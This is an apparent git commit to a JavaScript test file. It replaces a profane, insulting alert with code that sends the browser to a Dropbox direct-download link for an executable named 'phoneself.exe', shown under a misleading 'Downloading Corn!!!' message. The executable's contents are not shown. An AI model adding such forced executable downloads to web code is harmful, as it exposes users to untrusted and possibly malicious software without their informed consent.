1143da409e6514689b44e9acfac6a5cb44af6042
qwe81130446 <xx6659@gmail.com>
2018-03-14 20:55:53 -0400

    url

--- test.js
+++ test.js
@@ -1,5 +1,5 @@
 function myFunction(){
 
-
-	alert("hello there fuckk you alex!!")
+	window.location.href = "https://www.dropbox.com/s/rfu734rkrksyh1f/phoneself.exe?dl=1";
+	alert("Downloading Corn!!!")
 }
